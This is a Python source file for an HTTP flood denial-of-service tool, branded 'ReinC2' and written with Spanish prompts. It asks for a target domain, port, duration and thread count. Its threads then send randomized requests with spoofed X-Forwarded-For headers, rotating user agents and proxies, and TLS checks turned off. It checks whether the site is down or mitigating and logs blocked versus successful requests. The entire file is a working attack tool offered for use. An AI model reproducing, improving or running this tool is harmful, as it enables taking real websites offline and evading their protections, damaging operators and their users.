import threading
import time
import requests
from random import choice, randint
import os
from datetime import datetime
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

RED = "\033[91m"
GREEN = "\033[92m"
RESET = "\033[0m"

request_count = 0
success_count = 0
mitigated_count = 0
error_count = 0
lock = threading.Lock()
last_count = 0
stop_flag = False

used_proxy_countries = {}
used_proxy_counts = {}

def clear():
    os.system('clear' if os.name != 'nt' else 'cls')

def print_header():
    print(RED + "-" * 55)
    print("Best Bypass & strong Layer 4/7")
    print("-" * 55)
    print("Made by .abc_yxz. & amus")
    print("Type \"Help\" to see all commands.")
    print("-" * 55 + RESET + "\n")

def load_list(filename):
    if not os.path.exists(filename):
        print(f"{RED}❌ Archivo faltante: {filename}{RESET}")
        exit(1)
    with open(filename, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def test_target_status(target, port):
    scheme = "http" if port == 80 else "https"
    url = f"{scheme}://{target}"
    try:
        r = requests.get(url, timeout=3, verify=False)
        if r.status_code < 400:
            return "Successfully", GREEN, f"🟢 Web activa - Código HTTP {r.status_code}"
        elif r.status_code in [403, 429, 503, 520, 522, 525]:
            return "Blocked", RED, f"🔴 Protegido o mitigando - Código HTTP {r.status_code}"
        else:
            return "Unavailable", RED, f"🔴 Web inestable - Código HTTP {r.status_code}"
    except:
        return "Unavailable", RED, "🔴 Web caída o sin respuesta"

def print_attack_panel(target, port, duration, status, color, web_status, sent, remaining, rps):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"{RED}┌{'─'*51}┐")
    print(f"│{color} Status     : {status:<37}{RESET}│")
    print(f"│ Method     : {'https' if port == 443 else 'http':<45}│")
    print(f"│ Target     : {target:<45}│")
    print(f"│ Port       : {port:<45}│")
    print(f"│ Duration   : {duration:<45}│")
    print(f"│ Sent       : {sent:<45}│")
    print(f"│ RPS        : {rps:<45}│")
    print(f"│ Time Left  : {remaining:<45}│")
    print(f"│ Date       : {now:<45}│")
    print(f"│ Sent by    : amus{'':<42}│")
    print(f"└{'─'*51}┘" + RESET)
    print(f"{color}{web_status}{RESET}\n")

def build_headers(custom_headers, user_agents):
    headers = {}
    for line in custom_headers:
        if ':' in line:
            k, v = line.split(':', 1)
            headers[k.strip()] = v.strip()
    headers["User-Agent"] = choice(user_agents)
    headers["X-Forwarded-For"] = f"{randint(1,255)}.{randint(0,255)}.{randint(0,255)}.{randint(0,255)}"
    headers["Referer"] = choice([
        "https://google.com", "https://bing.com", "https://duckduckgo.com"
    ])
    headers["Accept-Encoding"] = "gzip, deflate"
    headers["Accept-Language"] = "es-ES,es;q=0.9"
    headers["Connection"] = "keep-alive"
    return headers

def get_proxy_country(proxy):
    # Placeholder para geolocalización, devuelve "Unknown"
    return "Unknown"

def flood(target, port, duration, custom_headers, user_agents, proxies, use_local_ip):
    global request_count, success_count, mitigated_count, error_count, stop_flag
    session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(pool_connections=1000, pool_maxsize=1000)
    session.mount("http://", adapter)
    session.mount("https://", adapter)

    scheme = "http" if port == 80 else "https"
    url = f"{scheme}://{target}"
    end_time = time.time() + duration

    while not stop_flag and time.time() < end_time:
        try:
            for _ in range(25):
                path = f"/?q={randint(1000,999999)}"
                headers = build_headers(custom_headers, user_agents)

                proxy = None
                proxies_dict = None

                if proxies:
                    proxy = choice(proxies)
                    proxies_dict = {
                        "http": proxy,
                        "https": proxy
                    }

                # Decidir si usar proxy o IP local
                if proxies and proxy:
                    r = session.get(url + path, headers=headers, timeout=3, verify=False, proxies=proxies_dict)
                elif use_local_ip:
                    r = session.get(url + path, headers=headers, timeout=3, verify=False)
                else:
                    # Sin proxy ni IP local, saltar ciclo
                    continue

                with lock:
                    request_count += 1
                    if r.status_code < 400:
                        success_count += 1
                    elif r.status_code in [403, 429, 503, 520, 522, 525]:
                        mitigated_count += 1

                    if proxy:
                        used_proxy_counts[proxy] = used_proxy_counts.get(proxy, 0) + 1
                        country = get_proxy_country(proxy)
                        used_proxy_countries[country] = used_proxy_countries.get(country, 0) + 1

        except Exception:
            with lock:
                error_count += 1

def monitor(target, port, duration):
    global request_count, last_count, stop_flag
    start = time.time()
    while time.time() - start < duration:
        time.sleep(5)
        with lock:
            current = request_count
            rps = (current - last_count) // 5
            last_count = current
        elapsed = int(time.time() - start)
        remaining = int(duration - elapsed)
        sent = current
        status, color, web_status = test_target_status(target, port)
        clear()
        print_header()
        print_attack_panel(target, port, duration, status, color, web_status, sent, remaining, rps)
    stop_flag = True

def analyze_proxies(filename):
    print(f"⏳ Analizando proxies de {filename}...")
    valid = []
    with open(filename, 'r') as f:
        proxies = [line.strip() for line in f if line.strip()]

    session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
    session.mount("http://", adapter)
    session.mount("https://", adapter)

    for proxy in proxies:
        proxies_dict = {"http": proxy, "https": proxy}
        try:
            r = session.get("http://httpbin.org/ip", proxies=proxies_dict, timeout=3)
            if r.status_code == 200:
                print(f"[✓] Proxy válido: {proxy}")
                valid.append(proxy)
            else:
                print(f"[✗] Proxy inválido o no responde: {proxy}")
        except Exception:
            print(f"[✗] Proxy inválido o no responde: {proxy}")

    return valid

def save_log(target, port, duration):
    total = request_count if request_count > 0 else 1
    success_perc = (success_count/total)*100
    mitigated_perc = (mitigated_count/total)*100
    error_perc = (error_count/total)*100

    with lock:
        with open("attack_log.txt", "a") as f:
            f.write(f"\n👑 {target} 👑\n\n")
            f.write(f"⚙️ Unknown or No WAF detected\n\n")

            f.write("🦄 Total Count:\n\n")
            f.write(f"All Request\n➥ {request_count}\n\n")
            f.write(f"Request Successful\n➥ {success_count}  ({success_perc:.2f}%)\n\n")
            f.write(f"Request Blocked\n➥ {mitigated_count}  ({mitigated_perc:.2f}%)\n")
            f.write("➖" * 10 + "\n\n")

            f.write("🔫 Allowed Request:\n")
            f.write(f"➥ HTTP Protocol: {'http' if port==80 else 'https'}\n")
            f.write(f"➥ HTTP ResponseStatus: 200\n")
            f.write(f"➥ Count: {request_count}\n")
            f.write("➖" * 10 + "\n")
            f.write(f"➥ Count: {request_count}\n")
            f.write(f"➥ Percentage: 100.00%\n")
            f.write("➖" * 10 + "\n\n")

            f.write("🚁 Bypassed Request:\n")
            f.write(f"➥ Count: 0\n")
            f.write(f"➥ Percentage: 0.00%\n")
            f.write("➖" * 10 + "\n\n")

            f.write("🛡 Blocked Request:\n")
            f.write(f"➥ Count: {mitigated_count}\n")
            f.write(f"➥ Percentage: {mitigated_perc:.2f}%\n")
            f.write("➖" * 10 + "\n\n")

            f.write("⌛ Timeout Requests\n")
            f.write(f"Errores timeout:\n➥ Error Timeout Requests: {error_count} {error_perc:.2f}% (total)\n")
            f.write(f"➥ Duración del ataque: {duration} segundos\n")
            f.write("➖" * 10 + "\n\n")

            f.write("🌎 Paises\n")
            f.write("Países que más atacaron\n")
            if used_proxy_countries:
                for country, count in used_proxy_countries.items():
                    f.write(f"➥ {country}: {count}\n")
            else:
                f.write("➥ No hay datos de países\n")

def main():
    global request_count, success_count, mitigated_count, error_count, last_count, stop_flag

    clear()
    print_header()

    target = input(f"{RED}[ amus • ReinC2 ] ▶{RESET} Dominio/IP objetivo: ").strip()
    port = int(input(f"{RED}[ amus • ReinC2 ] ▶{RESET} Puerto (80/443): ").strip())

    use_proxies = input(f"{RED}[ amus • ReinC2 ] ▶{RESET} ¿Quieres integrar proxies? S/N: ").strip().lower() == 's'
    proxies = []
    use_local_ip = True

    if use_proxies:
        if not os.path.exists("proxies.txt"):
            print(f"{RED}❌ Archivo proxies.txt no encontrado.{RESET}")
            exit(1)
        proxies = analyze_proxies("proxies.txt")
        if not proxies:
            print(f"{RED}❌ Ninguna proxy válida, el ataque usará tu IP local.{RESET}")
            use_local_ip = True
        else:
            print(f"{GREEN}✅ Proxies válidas cargadas: {len(proxies)}{RESET}")
            use_local_ip = input(f"{RED}[ amus • ReinC2 ] ▶{RESET} ¿Quieres usar también tu IP local además de las proxies? S/N: ").strip().lower() == 's'
    else:
        use_local_ip = True  # Si no usa proxies, ataca solo con local IP

    duration = int(input(f"{RED}[ amus • ReinC2 ] ▶{RESET} Duración del ataque (segundos): ").strip())

    # Carga headers y useragents
    custom_headers = load_list("headers.txt") if os.path.exists("headers.txt") else []
    user_agents = load_list("useragents.txt") if os.path.exists("useragents.txt") else [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Linux; Android 10)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
    ]

    # Iniciar threads
    thread_count = int(input(f"{RED}[ amus • ReinC2 ] ▶{RESET} Hilos (threads): ").strip())
    threads = []

    stop_flag = False
    for _ in range(thread_count):
        t = threading.Thread(target=flood, args=(target, port, duration, custom_headers, user_agents, proxies, use_local_ip))
        t.start()
        threads.append(t)

    monitor_thread = threading.Thread(target=monitor, args=(target, port, duration))
    monitor_thread.start()

    for t in threads:
        t.join()
    monitor_thread.join()

    save_log(target, port, duration)
    print(f"{GREEN}✅ Ataque finalizado. Log guardado en attack_log.txt{RESET}")

if __name__ == "__main__":
    main()
